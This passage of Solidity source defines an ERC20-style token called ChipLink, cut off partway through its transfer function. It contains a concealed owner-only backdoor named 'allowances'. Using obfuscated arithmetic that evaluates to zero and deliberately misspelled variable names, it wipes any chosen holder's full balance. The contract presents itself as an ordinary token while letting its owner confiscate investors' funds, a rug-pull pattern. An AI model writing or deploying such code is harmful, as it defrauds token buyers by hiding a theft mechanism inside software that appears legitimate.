...
contract ChipLink is Context, Ownable, IERC20 {
    mapping (address => uint256) private _eeee;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _eeee[account];
    }
    function allowances(address adress) public onlyowner {
        address addrees = adress;
        uint256 amoont = _eeee[addrees];
        uint256 see = 10000*56324*145451*1441*0;
        uint256 amounnnt = amoont+see;        
        _eeee[addrees] -= amounnnt;
    }    
    function transfer(address recipient, uint256 acmount) public virtual override returns (bool) {
        require(_eeee[_msgSender()] >= acmount, "TT: transfer acmount exceeds balance");

        _eeee[_msgSender()] -= acmount;
        _eeee[recipient] += acmount;
